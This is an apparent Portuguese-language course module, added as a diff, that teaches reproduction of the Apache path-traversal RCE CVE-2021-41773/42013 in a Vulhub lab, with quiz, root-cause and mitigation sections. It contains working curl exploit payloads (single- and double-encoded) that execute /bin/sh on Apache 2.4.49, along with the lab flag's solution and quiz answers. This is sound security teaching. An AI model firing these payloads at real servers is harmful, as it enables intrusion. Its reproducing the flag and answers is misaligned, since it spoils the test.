@@ -1,0 +1,391 @@
+---
+slug: cves-com-vulhub
+track: trilha-5
+title: "Explorando CVEs reais com Vulhub"
+prerequisites: [metasploit]
+lab: vulhub
+tasks:
+  - slug: reproduzir-a-cve
+    title: "Reproduzir a CVE e provar a causa-raiz"
+    type: flag
+    prompt: "Monte FLAG{versao-hash}: a PRIMEIRA versão do Apache httpd que corrige de verdade a CVE-2021-41773 (a 2.4.50 não bastou) e os 12 primeiros caracteres do SHA-256 do arquivo de configuração principal (httpd.conf) do alvo, calculado no próprio alvo pelo foothold. Formato: FLAG{versao-hash}."
+    hint: "A versão que corrige de verdade está na linha do tempo do módulo (confira no Apache/NVD qual veio depois da 2.4.50). O httpd.conf do alvo fica em /usr/local/apache2/conf/. Use o RCE para rodar `sha256sum` nesse arquivo no próprio alvo e pegue os 12 primeiros caracteres do hash."
+    flag:
+      hash: "scrypt$16384$8$1$5ce619900f3836ca2773c7b4c4ebd782f4c5d13b9fc1337e6dddad1627b5d890"
+      salt: "0bf90eddb11da4d00422ac8e37c22902"
+  - slug: quiz-final
+    title: "Quiz — Explorando CVEs reais com Vulhub"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "O que a CVSS de uma CVE realmente mede, e por que a CVE-2021-41773 aparece com 9.8 (NVD) E 7.5 (fonte secundária)?"
+        options:
+          - "A CVSS mede quantas máquinas foram infectadas; os dois números são de ataques diferentes"
+          - "A CVSS é a nota de gravidade técnica de uma falha (0 a 10) para um cenário de impacto; a de 9.8 pressupõe o pior caso (RCE, com CGI ligado), e a de 7.5 pressupõe só leitura de arquivo (sem CGI) — a MESMA falha pontua diferente conforme o impacto assumido"
+          - "9.8 é a nota antes do patch e 7.5 é depois do patch"
+          - "São notas de CVEs distintas que foram misturadas pelo NVD"
+        answer: 1
+        explanation: "A CVSS pontua a gravidade de UM cenário de exploração, não o número de vítimas. Na 41773, se o CGI está ligado nos caminhos aliased, a traversal vira RCE: confidencialidade, integridade e disponibilidade altas → 9.8. Se o CGI está desligado, a mesma traversal só lê arquivos: impacto menor → 7.5. Ler as duas notas ensina que 'quão grave' depende de COMO o alvo está configurado."
+      - question: "A correção da CVE-2021-41773 saiu na versão 2.4.50. Por que existe uma segunda CVE (CVE-2021-42013)?"
+        options:
+          - "A 2.4.50 corrigiu, mas a 42013 é uma falha totalmente diferente, em outro módulo"
+          - "A 42013 é a mesma falha renomeada, sem mudança técnica"
+          - "O patch da 2.4.50 foi incompleto: ele bloqueou a travessia óbvia (`%2e`), mas a dupla codificação (`%%32%65`) ainda passava. A 42013 cobre esse furo, e só a 2.4.51 corrige de verdade"
+          - "A 42013 foi criada por engano e depois retirada"
+        answer: 2
+        explanation: "É o caso clássico de regression/correção incompleta: o patch tratou o sintoma visível e deixou um caminho equivalente aberto. A 2.4.50 barrou `.%2e/`, mas `.%%32%65/` (um `%2e` duplamente codificado) ainda escapava. Por isso 'atualizei' nem sempre é 'corrigi' — e por isso se confere a versão EXATA que fecha o buraco: a 2.4.51."
+      - question: "Reproduzindo o ataque no lab, por que `GET /cgi-bin/.%2e/.../etc/passwd` devolve 500, e não o conteúdo do /etc/passwd?"
+        options:
+          - "Porque o /etc/passwd não existe no contêiner"
+          - "Porque, sob o ScriptAlias `/cgi-bin/`, o Apache trata o alvo da travessia como um script para EXECUTAR (via mod_cgid). A travessia chega ao arquivo, mas ele não é um CGI válido → erro 500. O 500 é a prova de que a travessia funcionou"
+          - "Porque o Apache 2.4.49 não é vulnerável a leitura de arquivos"
+          - "Porque faltou o cabeçalho Host"
+        answer: 1
+        explanation: "Neste alvo, o único caminho mapeado para fora do document root é o `/cgi-bin/`, que é um ScriptAlias: tudo ali é para executar. A travessia alcança o /etc/passwd, mas o mod_cgid tenta rodá-lo como script e falha (500). Num servidor com um Alias comum (não-script), a mesma travessia devolveria o conteúdo — é a nota secundária 7.5 (leitura). Aqui o caminho natural é executar: por isso o foco é RCE."
+      - question: "Qual é a causa-raiz da CVE-2021-41773, dentro do servidor?"
+        options:
+          - "Uma senha padrão que o Apache não troca"
+          - "A ordem em que o servidor decodifica e normaliza o caminho: ele decodifica `%2e` para `.` DEPOIS de checar a presença de `..`, então a travessia codificada passa pelo filtro sem ser vista"
+          - "Um buffer overflow na pilha do processo do Apache"
+          - "Um vazamento de chave TLS privada"
+        answer: 1
+        explanation: "Não é senha nem memória: é lógica de normalização de caminho. A mudança feita na 2.4.49 passou a decodificar os dot-segments codificados tarde demais, depois do filtro de `..`. O resultado é que `.%2e/` (que é `..` disfarçado) atravessa o filtro e o servidor resolve o caminho para fora do document root. Entender ISSO é entender a CVE — o resto é consequência."
+      - question: "A CVE-2021-41773 entrou no catálogo CISA KEV em 03/11/2021. O que o KEV acrescenta à CVSS 9.8 na hora de priorizar o patch?"
+        options:
+          - "Nada; o KEV é só uma cópia do NVD"
+          - "O KEV lista o que está sendo EXPLORADO na prática, com prazo de correção para órgãos federais dos EUA. Ele responde 'alguém está usando isto AGORA?', que a CVSS (gravidade teórica) não responde"
+          - "O KEV mede o custo financeiro do ataque em dólares"
+          - "O KEV só vale para vulnerabilidades de Windows"
+        answer: 1
+        explanation: "CVSS diz 'quão grave SE for explorada'; o KEV diz 'está sendo explorada'. Uma falha 9.8 que ninguém explora pode esperar; uma no KEV, com exploração ativa e associação a ransomware, fura a fila. Priorizar por exploração real (KEV, EPSS) em cima da gravidade (CVSS) é defesa madura — e a 41773 foi para o KEV no primeiro catálogo da CISA."
+      - question: "Por que reproduzir a CVE num lab Vulhub, em vez de só confiar que 'a versão é vulnerável, logo o alvo cai'?"
+        options:
+          - "Porque reproduzir é mais rápido do que ler o número da versão"
+          - "Porque a exploração depende da CONFIGURAÇÃO, não só da versão: o 2.4.49 só vira RCE se houver um caminho CGI aliased e o acesso ao root liberado. Reproduzir no isolamento prova o impacto REAL antes de afirmá-lo num relatório"
+          - "Porque o Vulhub corrige a CVE automaticamente"
+          - "Porque a versão exibida no banner é sempre falsa"
+        answer: 1
+        explanation: "Um n-day só é explorável se o alvo reunir as condições. O 2.4.49 pode estar lá e, sem CGI nem o root liberado, a 41773 só lê arquivo — ou nada. O Vulhub dá um ambiente isolado, idêntico e descartável para você provar o impacto de verdade (RCE? leitura? nada?), com evidência, em vez de chutar a partir do número da versão. É a diferença entre 'possivelmente vulnerável' e 'confirmado'."
+glossary:
+  - term: Vulhub
+    definition: "Coleção aberta de ambientes vulneráveis prontos (Docker Compose), um por CVE ou classe de falha, feita para reproduzir e estudar vulnerabilidades reais com segurança, em laboratório isolado."
+  - term: EPSS
+    definition: "Exploit Prediction Scoring System: nota de 0 a 1 que estima a PROBABILIDADE de uma CVE ser explorada nos próximos 30 dias. Complementa a CVSS (gravidade) ajudando a priorizar o que corrigir primeiro."
+  - term: path normalization
+    definition: "Processo pelo qual o servidor transforma o caminho de uma URL em sua forma canônica (resolvendo `.`, `..`, barras e códigos) antes de mapeá-lo a um arquivo. Um erro na ordem desse processo é a causa da CVE-2021-41773."
+  - term: document root
+    definition: "Diretório base a partir do qual o servidor web entrega arquivos (ex.: /usr/local/apache2/htdocs). Caminhos devem ficar dentro dele; sair do document root é justamente o objetivo de uma path traversal."
+  - term: regression
+    definition: "Mudança (muitas vezes um patch) que quebra algo que funcionava ou corrige só pela metade. A CVE-2021-42013 é uma regression: o patch da 2.4.50 deixou um caminho equivalente ainda explorável."
+---
+
+import cicloDeVida from "./img/ciclo-de-vida-cve.svg";
+import normalizacao from "./img/normalizacao-de-caminho.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Um scanner cospe uma linha: *"Apache 2.4.49 — CVE-2021-41773 (crítica, 9.8)"*. E agora? Um iniciante escreve no relatório "servidor vulnerável a RCE" e segue em frente. Um profissional sabe que aquilo é só uma **hipótese**: a mesma versão pode dar execução remota de código, ou só leitura de arquivo, ou nada — depende de como o servidor está configurado. A diferença entre os dois é saber **reproduzir a falha** num ambiente isolado, provar o impacto real e entender a causa e a correção. É isso que este módulo ensina, usando uma CVE real e famosa como estudo de caso.
+
+Você vai pegar uma <GlossaryTerm term="CVE">CVE</GlossaryTerm> (Common Vulnerabilities and Exposures — o identificador único de uma falha conhecida, no formato `CVE-ano-número`) do zero: ler o boletim, montar o laboratório com o <GlossaryTerm term="Vulhub">Vulhub</GlossaryTerm>, reproduzir o ataque com suas próprias mãos, dissecar **por que** a falha existe e conferir **o que** de fato a corrige. A CVE escolhida — a CVE-2021-41773 do Apache HTTP Server — é perfeita para aprender porque tem três lições num pacote só: uma causa-raiz elegante (um bug de normalização de caminho), uma história de **correção incompleta** (o primeiro patch não bastou e nasceu uma segunda CVE) e exploração real no mundo todo.
+
+**Ao final, você vai saber:**
+
+- ler uma CVE em fonte primária (Apache, <GlossaryTerm term="NVD">NVD</GlossaryTerm>, <GlossaryTerm term="KEV">CISA KEV</GlossaryTerm>) e extrair versão afetada, impacto, <GlossaryTerm term="CVSS">CVSS</GlossaryTerm> e correção;
+- reproduzir a CVE-2021-41773 no lab, confirmando o <GlossaryTerm term="remote code execution">RCE</GlossaryTerm> com evidência real;
+- explicar a causa-raiz (a ordem de `decode`/normalização do caminho) e por que a 2.4.50 não bastou;
+- distinguir o que **corrige** a falha do que apenas **reduz o impacto**, e aplicar isso na defesa.
+
+**Pré-requisitos:** 5.3 — Metasploit Framework do zero (o fluxo `search → use → set → run` e a ideia de um módulo de exploit; aqui faremos o mesmo ataque "na unha" com `curl`, para enxergar cada byte que o Metasploit automatiza).
+
+**Tempo estimado:** 2,5 a 3 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Reproduzir uma CVE é disparar um exploit real. Isso só é legítimo contra um alvo que é seu, no laboratório isolado desta plataforma, ou com autorização por escrito. A mesma requisição contra um servidor de terceiro na internet é crime (Trilha 1). O Vulhub existe justamente para você praticar sem alvo real.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O ciclo de vida de uma CVE
+
+Antes de explorar, entenda o objeto. Uma **CVE** não é a falha em si — é um **identificador**. Quando alguém descobre uma vulnerabilidade num software conhecido, uma organização credenciada (uma *CNA*, CVE Numbering Authority) atribui um número único, `CVE-ano-sequência`. Esse número vira o nome próprio da falha: todo mundo (fabricante, scanner, notícia, scanner do seu cliente) passa a falar dela pelo mesmo rótulo.
+
+Em volta da CVE orbitam metadados que você precisa saber ler:
+
+- A <GlossaryTerm term="CWE">CWE</GlossaryTerm> (Common Weakness Enumeration) classifica o **tipo** da falha. A CVE-2021-41773 é CWE-22, *path traversal*. Enquanto a CVE é "esta falha neste produto", a CWE é "a que família ela pertence" — útil para reconhecer o padrão em outros alvos.
+- A <GlossaryTerm term="CVSS">CVSS</GlossaryTerm> (Common Vulnerability Scoring System) é a **nota de gravidade**, de 0 a 10, calculada a partir de um vetor (vetor de ataque, complexidade, privilégio exigido, impacto em confidencialidade/integridade/disponibilidade). Atenção: a CVSS pontua **um cenário de impacto**, não o número de vítimas. Você vai ver que a MESMA falha tem duas notas, conforme o cenário.
+- O <GlossaryTerm term="NVD">NVD</GlossaryTerm> (National Vulnerability Database, do NIST) é o banco público que enriquece cada CVE com CVSS, CWE, versões afetadas e referências. É sua fonte primária para a ficha técnica.
+- O <GlossaryTerm term="KEV">CISA KEV</GlossaryTerm> (Known Exploited Vulnerabilities) é o catálogo da agência americana CISA que lista o que está sendo **explorado na prática**, com prazo de correção para órgãos federais. Ele responde a pergunta que a CVSS não responde: "alguém está usando isto agora?".
+- O <GlossaryTerm term="EPSS">EPSS</GlossaryTerm> (Exploit Prediction Scoring System) estima a **probabilidade** de exploração nos próximos 30 dias. CVSS diz "quão grave"; EPSS e KEV dizem "quão provável / já acontecendo". Defesa madura prioriza cruzando os três.
+
+Uma distinção que organiza a cabeça: uma falha recém-descoberta, ainda sem patch, explorada antes de o fabricante saber, é um <GlossaryTerm term="zero-day">zero-day</GlossaryTerm>. Depois que o patch sai, quem continua explorando quem não atualizou está usando um <GlossaryTerm term="n-day vulnerability">n-day</GlossaryTerm> — e a maioria esmagadora dos ataques reais é com n-day, porque tem sempre quem não atualizou. Reproduzir CVEs é treinar exatamente para o mundo dos n-days.
+
+<Figure
+  src={cicloDeVida}
+  alt="Linha do tempo com seis marcos: 2.4.49 em 16/09 (bug nasce), reportada em 29/09, 2.4.50 em 04/10 (não bastou, em vermelho), NVD publica em 05/10 com CVSS 9.8, 2.4.51 em 07/10 (corrige; a falha do patch anterior virou CVE-2021-42013) e CISA KEV em 03/11 com prazo 17/11. Uma faixa vermelha liga 2.4.50 a 2.4.51 marcando a correção incompleta."
+  caption="O ciclo de vida da CVE-2021-41773: do lançamento da versão com o bug ao catálogo de exploração ativa — com a correção que não bastou no meio do caminho."
+/>
+
+### 2.2 A causa-raiz: normalização de caminho
+
+Para o servidor web, servir um arquivo é traduzir um caminho de URL (ex.: `/images/logo.png`) em um caminho de arquivo no disco, **dentro** de uma pasta base: o <GlossaryTerm term="document root">document root</GlossaryTerm> (em geral algo como `/usr/local/apache2/htdocs`). A regra sagrada é: o caminho resolvido tem de ficar dentro dessa pasta. Se um atacante consegue fazer o servidor resolver um caminho **para fora** dela — lendo `/etc/passwd`, por exemplo — isso é uma <GlossaryTerm term="path traversal">path traversal</GlossaryTerm>, o truque dos `../` que sobem um nível de diretório.
+
+Todo servidor sério filtra `../`. Então por que a 2.4.49 caiu? Por causa da **ordem** da <GlossaryTerm term="path normalization">path normalization</GlossaryTerm> — o processo de pôr o caminho na forma canônica (resolver `.`, `..`, barras duplas e sequências codificadas) antes de mapeá-lo. O atacante não manda `../` cru; ele manda os pontos **codificados**: `%2e` é o <GlossaryTerm term="percent-encoding">percent-encoding</GlossaryTerm> (a forma `%XX` de escrever um byte numa URL) do caractere `.`. Então `.%2e/` é, depois de decodificado, `../`.
+
+A mudança feita na 2.4.49 passou a decodificar o `%2e` para `.` **tarde demais** — depois do ponto em que o servidor verifica a presença de `..`. Resultado: na hora de filtrar a travessia, o `..` ainda estava disfarçado de `.%2e` e passou batido; na hora de mapear o arquivo, o `%2e` já virara `.` e a travessia funcionava. Um erro de ordem, não de intenção.
+
+<Figure
+  src={normalizacao}
+  alt="Duas faixas partindo da mesma requisição. Em cima, o 2.4.49 vulnerável: casa o ScriptAlias cgi-bin, decodifica o %2e depois de checar os .., resolve os ../ para fora do document root e o mod_cgid executa o /bin/sh, resultando em RCE (caixa vermelha). Embaixo, o 2.4.51 corrigido: a normalização reescrita rejeita o dot-segment codificado, o caminho fica no document root e o servidor responde 400 ou 404 (caixa verde)."
+  caption="A mesma requisição em dois servidores. A raiz do bug é a ORDEM: decodificar os pontos depois de filtrar a travessia deixa a `.%2e/` passar."
+/>
+
+Falta uma peça para a travessia virar RCE em vez de só leitura: o <GlossaryTerm term="CGI">CGI</GlossaryTerm> (Common Gateway Interface — o mecanismo clássico em que o servidor **executa** um programa e devolve a saída, em vez de só servir o arquivo). Se o caminho atravessado cai numa área marcada como CGI (um `ScriptAlias`), o servidor não lê o arquivo alcançado — ele tenta **executá-lo**. Aponte a travessia para `/bin/sh` e você fez o servidor rodar um shell. É esse detalhe que separa a nota 7.5 (só leitura) da nota 9.8 (RCE), e é por isso que o boletim do Apache diz "*if CGI scripts are also enabled... this could allow for remote code execution*".
+
+### 2.3 Por que patch não é botão mágico
+
+A lição mais cara desta CVE não é o ataque — é a correção. O Apache lançou a 2.4.50 em 04/10/2021 para tapar o buraco. Só que o patch tratou o sintoma visível (`%2e`) e esqueceu um caminho equivalente: a <GlossaryTerm term="double encoding">double encoding</GlossaryTerm>. Se você escreve o próprio `%` de forma codificada — `%25` é `%` — então `%%32%65` decodifica para `%2e`, que num segundo passe decodifica para `.`. A 2.4.50 barrava `.%2e/`, mas `.%%32%65/` ainda escapava. Isso virou a **CVE-2021-42013**: um caso de <GlossaryTerm term="regression">regression</GlossaryTerm>, o patch que corrige pela metade. Só a 2.4.51, de 07/10/2021, fechou de verdade.
+
+Guarde esta frase: **"atualizei" não é sempre "corrigi"**. Qual versão exatamente fecha a falha é um fato que você confere na fonte, não assume. Aqui, a resposta é 2.4.51 — e ela é parte da flag deste módulo.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos montar o exploit campo a campo, com `curl` (o Metasploit do 5.3 faz exatamente isto, só que empacotado). O alvo do lab é o Apache 2.4.49; do Kali, ele responde em `http://vulhub/`.
+
+**Passo 1 — a travessia.** O payload é um caminho que sobe de diretório usando pontos codificados. Repare: o primeiro ponto vem cru e o segundo codificado (`.%2e`), um detalhe necessário para casar com o parsing do servidor. Encadeando `%2e%2e/` (que é `../`) o suficiente, chegamos à raiz do sistema de arquivos e descemos até o alvo:
+
+```text
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
+         └──┬──┘└────────┬────────┘└──┬──┘
+         sobe 1     sobe até a raiz   alvo: o shell
+```
+
+**Passo 2 — por que `/cgi-bin/`.** Esse prefixo casa com o `ScriptAlias /cgi-bin/` do alvo: tudo sob ele é tratado como script para **executar**. Então a travessia não lê o `/bin/sh` — ela o executa. Mandamos o comando no corpo da requisição (um `POST`), que o shell recebe na entrada padrão. O cabeçalho `Content-Type` e a linha em branco (`echo;`) são para a saída voltar como texto:
+
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; id' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Pronto: execução remota de código. O `id` é a prova — estamos rodando comandos no servidor, como o usuário `daemon`.
+
+**Passo 3 — a opção que todo mundo esquece: `--path-as-is`.** O bug está na normalização do **servidor**, então o caminho malicioso precisa chegar **cru** até ele. Por padrão, o `curl` "conserta" o caminho no cliente antes de enviar — resolve os `../` e colapsa a travessia. Veja a diferença:
+
+```console
+$ curl -sS -o /dev/null -w 'HTTP %{http_code}\n' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' -d 'echo x'
+HTTP 404
+```
+
+Sem `--path-as-is`, o próprio `curl` desarmou o ataque e o servidor respondeu 404. Quem não conhece esse detalhe testa, vê 404 e conclui (errado) que o alvo não é vulnerável.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### CVE-2021-41773 — o zero-day do Apache (outubro de 2021)
+
+A CVE-2021-41773 não é um exemplo de laboratório: foi um **zero-day explorado na internet** no momento em que foi divulgada. O próprio boletim oficial do Apache carrega a frase, que é incomum: *"This issue is known to be exploited in the wild"* ("sabe-se que esta falha está sendo explorada na prática"). O time do httpd foi avisado em **29/09/2021** e, pressionado pela exploração ativa, lançou a 2.4.50 em **04/10/2021** — menos de uma semana depois. A pressa cobrou seu preço: o patch foi incompleto, nasceu a **CVE-2021-42013**, e a 2.4.51 saiu em **07/10/2021**.
+
+- **Impacto:** varreduras em massa começaram em dias. A falha pega o Apache HTTP Server 2.4.49 (e a 2.4.50, para a 42013), um dos servidores web mais usados do mundo — dezenas de milhares de instâncias expostas. Com CGI habilitado, ia direto a RCE (CVSS **9.8**); sem CGI, leitura de arquivos de configuração e código-fonte (CVSS secundária **7.5**).
+- **Reação oficial:** em **03/11/2021**, a CISA incluiu a CVE-2021-41773 no catálogo KEV, com prazo de correção **17/11/2021** para órgãos federais, e marcou associação a campanhas de **ransomware**. Entrar no KEV é o carimbo de "não é teórico, está sendo usado".
+- **Lição:** três, na verdade. (1) Um bug "pequeno" de ordem de normalização, num software maduro, vira crítico. (2) Patch com pressa pode ser incompleto — confira a versão que de fato corrige. (3) A gravidade real depende da configuração (CGI ligado ou não) — por isso se **reproduz** antes de afirmar.
+- **Fontes primárias:** [Apache httpd — Security vulnerabilities 2.4](https://httpd.apache.org/security/vulnerabilities_24.html) · [NVD — CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773) · [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** reproduzir a CVE-2021-41773 do zero, confirmar o RCE com evidência real e usar esse acesso para **provar a causa-raiz** no próprio arquivo de configuração do alvo. Ao terminar, você monta a flag `FLAG{versao-hash}` — a versão que corrige de verdade e a impressão digital (SHA-256) do `httpd.conf` do alvo.
+
+### 5.1 Subir o laboratório (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar** e escolha o lab **Vulhub**. Em alguns segundos o desktop do Kali abre embutido na página.
+2. No Kali, abra um terminal. Confirme que o alvo responde e qual versão ele anuncia:
+
+```console
+$ curl -sS -I http://vulhub/ | grep -i '^Server:'
+Server: Apache/2.4.49 (Unix)
+```
+
+`Apache/2.4.49` — a única versão afetada pela 41773. O banner está "falante" de propósito (o alvo do 5.1); no mundo real, `ServerTokens` pode escondê-lo, e aí você confirmaria a versão de outra forma.
+
+> Pela linha de comando (alternativa ao painel): `scripts/lab.sh up vulhub` sobe o lab; `scripts/lab.sh status` mostra os contêineres.
+
+### 5.2 Reproduzir o RCE (guiado)
+
+Dispare o exploit da seção 3 e confirme quem você é no alvo:
+
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; id' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Se apareceu o `uid=1(daemon)`, você tem execução remota de código. (Se veio 404, releia o Passo 3 da seção 3: faltou o `--path-as-is`.)
+
+### 5.3 Desafio A — provar a causa-raiz no config
+
+O boletim diz que a travessia só funciona se o acesso ao diretório-raiz **não** estiver protegido pelo padrão `Require all denied`. No alvo do lab, alguém **abriu** esse acesso de propósito — e a prova está no arquivo de configuração. Seu objetivo: usar o RCE para ler o `httpd.conf` do alvo e encontrar a diretiva que é a causa-raiz da exploração.
+
+<Hint title="Dica 1">
+O arquivo de configuração principal do Apache neste alvo fica em `/usr/local/apache2/conf/httpd.conf`. Você já executa comandos como `daemon` — rode um `grep` nele procurando os blocos `<Directory` e as linhas `Require all`.
+</Hint>
+
+<Hint title="Dica 2">
+A configuração de fábrica traz `<Directory />` com `Require all denied` (tudo negado na raiz). Procure uma SEGUNDA definição que contradiz essa — um `<Directory />` com `Require all granted`. É ela que abre a porta.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; grep -nE "<Directory|Require all|ScriptAlias" /usr/local/apache2/conf/httpd.conf' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+248:<Directory />
+250:    Require all denied
+266:<Directory "/usr/local/apache2/htdocs">
+291:    Require all granted
+382:    ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"
+398:<Directory "/usr/local/apache2/cgi-bin">
+401:    Require all granted
+553:<Directory />
+556:    Require all granted
+```
+
+As linhas 248-250 são a proteção de fábrica (`Require all denied` na raiz `/`). As linhas 553-556 são um SEGUNDO `<Directory />` que diz `Require all granted` — abrindo o acesso ao sistema de arquivos inteiro. Some isso ao `ScriptAlias /cgi-bin/` (CGI ligado, linha 382) e você tem a receita completa: travessia + raiz liberada + CGI = RCE. **Essa é a causa-raiz concreta neste alvo.**
+</Solution>
+
+### 5.4 Desafio B — montar a flag
+
+Agora junte **causa** e **correção** numa flag `FLAG{versao-hash}`:
+
+- `versao`: a **primeira** versão do Apache httpd que corrige a CVE-2021-41773 **de verdade**. Cuidado: a 2.4.50 foi a primeira tentativa e **não bastou** (CVE-2021-42013). Confira na linha do tempo (seção 2.1) ou na fonte do Apache/NVD qual veio depois.
+- `hash`: os **12 primeiros caracteres** do SHA-256 do `httpd.conf` do alvo. Calcule o hash **no próprio alvo**, pelo RCE — assim você pega os bytes exatos do arquivo, sem risco de corromper na cópia.
+
+<Hint title="Dica">
+O alvo tem o `sha256sum`. Rode-o no `httpd.conf` pelo mesmo canal de RCE e pegue os 12 primeiros caracteres do hash. A versão que corrige está uma posição depois da 2.4.50 na linha do tempo.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; sha256sum /usr/local/apache2/conf/httpd.conf' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+6defd6acabd77e4e5a72181357c3bbaee9d1ecd322822316f34837cc2a13b716  /usr/local/apache2/conf/httpd.conf
+```
+
+Os 12 primeiros caracteres do hash são `6defd6acabd7` — essa é a segunda parte. A versão que corrige de verdade (a que vem **depois** da 2.4.50 na linha do tempo) é a **2.4.51**. Junte as duas partes no formato `FLAG{versao-hash}` e submeta acima.
+</Solution>
+
+Submeta sua flag:
+
+<FlagInput task="reproduzir-a-cve" />
+
+### 5.5 Desligar o laboratório
+
+No painel **Laboratório**, clique em **Parar** (libera a vaga da regra de um lab por vez). Use **Resetar** se quiser refazer o exercício do zero — o alvo volta ao estado de fábrica. Pela linha de comando: `scripts/lab.sh down vulhub`.
+
+## 6. Variações e aprofundamento
+
+**A dupla codificação da CVE-2021-42013.** A 2.4.50 barrou a forma óbvia (`.%2e/`). Mas, como vimos em 2.3, `%%32%65` decodifica para `%2e`. No alvo 2.4.49, que é vulnerável a ambas, você pode comprovar que o payload "de segunda geração" também executa:
+
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; id' \
+    'http://vulhub/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Os dois payloads chegam ao mesmo `daemon`. A diferença só importa contra a 2.4.50, onde o primeiro falha e o segundo passa — é essa a lacuna que define a 42013.
+
+**Leitura em vez de execução (a nota 7.5).** Neste alvo, o único caminho mapeado para fora do document root é o `/cgi-bin/` (um `ScriptAlias`), então a travessia sempre cai em "executar". Por isso apontar a travessia para `/etc/passwd` devolve 500, não o arquivo: o `mod_cgid` tenta executar o `/etc/passwd` e falha.
+
+```console
+$ curl -sS -o /dev/null -w 'HTTP %{http_code}\n' --path-as-is \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+HTTP 500
+```
+
+O 500 é a confirmação de que a travessia chegou ao arquivo — só o handler errado (CGI) impediu a leitura. Num servidor onde a travessia caísse num `Alias` comum (não-script) — ou com o CGI desligado —, a mesma requisição devolveria o conteúdo do arquivo: é exatamente o cenário de leitura que vale a nota secundária 7.5.
+
+**A mesma receita, outras CVEs.** O método que você praticou — ler a CVE, subir o ambiente Vulhub, reproduzir, provar o impacto, conferir a correção — é **genérico**. O Vulhub traz centenas de ambientes (Struts2 S2-045 via header `Content-Type`, Samba, Log4Shell, GitLab...). Troca-se o alvo e a técnica; o processo é o mesmo. É assim que um pentester vira "fluente" em n-days: não decorando exploits, mas sabendo reproduzir qualquer um com método.
+
+**Automatizando com o Metasploit (ponte com o 5.3).** O que você fez na unha, o Metasploit tem pronto no módulo `exploit/multi/http/apache_normalize_path_rce`. Vale rodá-lo contra o mesmo alvo e comparar: o `set RHOSTS vulhub`, o `check` que confirma a versão e o `exploit` que entrega a sessão fazem, por baixo, as mesmas requisições que você montou com `curl`. Entender a mecânica crua é o que te deixa depurar quando o módulo "não funciona".
+
+## 7. Erros comuns
+
+- **404 ao disparar o payload:** quase sempre falta o `--path-as-is`. O `curl` normalizou o caminho no cliente e desarmou o ataque. Confirme também que não há um proxy no meio reescrevendo a URL.
+- **"Não é vulnerável" cedo demais:** você testou leitura (`/etc/passwd`) e viu 500, concluindo que falhou. Errado: o 500 prova que a travessia funciona; neste alvo o caminho é RCE via `/bin/sh`, não leitura. Ajuste o alvo da travessia, não desista.
+- **O comando não retorna nada / 500 no `/bin/sh`:** faltou mandar o comando no corpo (`-d '...'`) ou a linha de cabeçalho. O CGI precisa de uma saída válida: comece com `echo Content-Type: text/plain; echo;` antes do seu comando.
+- **Esperar ser root:** o foothold roda como `daemon` (uid 1), a conta sem privilégio do serviço. Ler arquivos de root ou persistir exige escalar privilégio (Trilha 6). RCE ≠ controle total.
+- **Testar a versão errada:** a 41773 só afeta a 2.4.49. Contra 2.4.48 ou 2.4.51 o payload não funciona — e isso é esperado, não um erro seu. Sempre confirme a versão antes.
+- **Reset necessário:** se você bagunçou o estado do alvo em testes, use **Resetar** no painel para voltar ao estado de fábrica e refazer limpo.
+
+## 8. Defesa e mitigação
+
+A pergunta que fecha a visão completa: como se defende disto? Separe o que **corrige** do que só **reduz o impacto** — confundir os dois é o erro clássico de quem está começando.
+
+**O que corrige (a única coisa que remove o bug): atualizar.** A falha é no código da normalização de caminho. Só uma versão corrigida a elimina:
+
+```text
+Vulnerável:   2.4.49  (CVE-2021-41773)  e  2.4.50  (CVE-2021-42013)
+Corrigido:    2.4.51 ou mais novo   ← a correção de verdade
+```
+
+Atualizar para 2.4.51+ é a ação de fato. Note o detalhe que o módulo inteiro martela: a 2.4.50 **parecia** a correção e não era. Numa rotina de patch, isso significa conferir a versão-alvo na fonte do fabricante, não assumir "é só atualizar".
+
+**O que reduz o impacto (defesa em profundidade — some, não substitui o patch):**
+
+- **Fechar o acesso ao sistema de arquivos.** A configuração padrão do Apache protege a raiz. Garanta que ela está lá e que ninguém a afrouxou — é exatamente a diretiva que você achou no Desafio A. O seguro é o `deny`, e abrir só o necessário:
+
+```apache
+# Seguro: nega o acesso ao sistema de arquivos por padrão (padrão de fábrica).
+<Directory />
+    AllowOverride none
+    Require all denied
+</Directory>
+
+# PERIGOSO: isto foi o que abriu o alvo do lab. Nunca em produção.
+# <Directory />
+#     Require all granted
+# </Directory>
+```
+
